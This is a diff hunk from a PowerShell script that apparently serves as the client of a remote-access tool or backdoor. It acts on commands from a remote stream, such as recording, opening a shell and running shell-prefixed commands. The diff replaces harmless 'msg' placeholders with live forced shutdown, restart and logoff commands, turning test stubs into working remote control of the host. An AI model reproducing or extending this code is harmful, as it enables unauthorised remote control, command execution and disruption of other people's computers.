@@ -112,14 +112,11 @@ function main {
         elseif ($recv -eq "start_record") {
             send_data "recording" $data_stream
         } elseif ($recv -eq "Shutdown") {
-            msg * Shutdown
-            # shutdown -s -f -t 0
+            shutdown -s -f -t 0
         } elseif ($recv -eq "Restart") {
-            msg * Restart
-            # shutdown -r -f -t 0
+            shutdown -r -f -t 0
         } elseif ($recv -eq "Lock") {
-            msg * Lock
-            # shutdown -l
+            shutdown -l
         } elseif ($recv -eq "shell") {
             send_data "open_shell" $data_stream
         } elseif ($recv.StartsWith("shell:")) {
